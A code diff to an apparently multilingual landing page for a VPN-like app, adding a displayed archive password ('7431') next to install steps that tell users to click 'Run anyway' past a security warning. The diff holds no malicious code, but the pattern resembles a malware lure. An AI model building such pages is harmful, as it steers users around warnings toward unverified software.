@@ -72,6 +72,7 @@ section { margin-bottom: 100px; }
 #copyEmail:hover { background: rgba(70,130,180,0.95); }
 footer { position: relative; z-index:3; text-align: center; padding:20px; color: rgba(255,255,255,0.8); font-size: 14px; }
 footer p { margin: 5px 0; }
+.archive-password { font-size:18px; color:var(--blue); margin-top:20px; text-align:center; }
 @media (max-width: 768px) {
   .tiles, .plans, .install-steps { flex-direction:column; align-items:center; }
   .nav { gap:10px; font-size:14px; }
@@ -81,6 +82,7 @@ footer p { margin: 5px 0; }
   section { margin-bottom: 60px; }
   .install-step img { width:150px; }
   #screenshotContent { max-width:90%; }
+  .archive-password { font-size:16px; margin-top:15px; }
 }
 </style>
 </head>
@@ -187,6 +189,7 @@ footer p { margin: 5px 0; }
         <img src="https://i.postimg.cc/PxGJzMmW/Screenshot-2025-09-11-101436.png" data-screenshot="https://i.postimg.cc/PxGJzMmW/Screenshot-2025-09-11-101436.png" alt="Завершено">
       </div>
     </div>
+    <p class="archive-password fade-in" data-i18n="archivePassword">Пароль от архива - (7431)</p>
   </section>
 </main>
 
@@ -257,7 +260,8 @@ const translations = {
     step1t:"Шаг 1: Установка", step1d:"Скачайте и запустите установочный файл.(Подробнее, Запустить в любом случае)",
     step2t:"Шаг 2: Ожидание загрузки", step2d:"Дождитесь завершения установки приложения.",
     step3t:"Шаг 3: Завершено", step3d:"Подключитесь и наслаждайтесь безопасным интернетом.",
-    closeScreenshot:"Закрыть"
+    closeScreenshot:"Закрыть",
+    archivePassword:"Пароль от архива - (7431)"
   },
   en:{
     about:"About Us",
@@ -287,7 +291,8 @@ const translations = {
     step1t:"Step 1: Installation", step1d:"Download and run the installation file.(More details, Run anyway)",
     step2t:"Step 2: Wait for Installation", step2d:"Wait for the application installation to complete.",
     step3t:"Step 3: Completed", step3d:"Connect and enjoy secure internet.",
-    closeScreenshot:"Close"
+    closeScreenshot:"Close",
+    archivePassword:"Archive password - (7431)"
   },
   de:{
     about:"Über uns",
@@ -317,7 +322,8 @@ const translations = {
     step1t:"Schritt 1: Installation", step1d:"Laden Sie die Installationsdatei herunter und führen Sie sie aus.(Weitere Details, trotzdem ausführen)",
     step2t:"Schritt 2: Warten auf Installation", step2d:"Warten Sie, bis die Installation der Anwendung abgeschlossen ist.",
     step3t:"Schritt 3: Abgeschlossen", step3d:"Verbinden Sie sich und genießen Sie sicheres Internet.",
-    closeScreenshot:"Schließen"
+    closeScreenshot:"Schließen",
+    archivePassword:"Archivpasswort - (7431)"
   }
 };
 
